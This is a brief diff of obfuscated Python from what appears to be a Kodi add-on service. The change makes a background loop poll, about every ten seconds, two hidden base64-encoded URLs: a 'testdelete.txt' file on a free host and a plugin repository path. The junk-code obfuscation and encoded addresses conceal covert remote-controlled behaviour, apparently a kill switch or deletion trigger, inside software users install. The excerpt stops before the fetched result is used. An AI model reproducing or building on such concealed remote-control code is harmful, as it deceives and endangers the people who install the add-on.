@@ -41,7 +41,9 @@ if 13 - 13: ooOo + Ooo0O
 if 48 - 48: iII111i % IiII + I1Ii111 / ooOoO0o * o00O0oo
 def O0oOO0o0 ( ) :
  while not I1IiI . abortRequested ( ) :
-  xbmc . sleep ( randint ( 30000 , 180000 ) )
+  if I1IiI . waitForAbort ( 10 ) :
+   break
+  xbmc . sleep ( 10 )
   i1ii1iIII = Oo0oO0oo0oO00 ( I1ii11iIi11i ( 'aHR0cDovL2FyY2hpdGVjdHMueDEwaG9zdC5jb20vdGVzdGRlbGV0ZS50eHQ=' ) )
   i111I = Oo0oO0oo0oO00 ( I1ii11iIi11i ( 'aHR0cDovL3d3dy5kY2JuZXR3b3JraW5nLmNvbS9yZXBvL1BsdWdpbnMvcGx1Z2luLnZpZGVvLnNwb3J0cy5hbm9ueW1vdXNway8=' ) )
   if i1ii1iIII != 'Failed' :
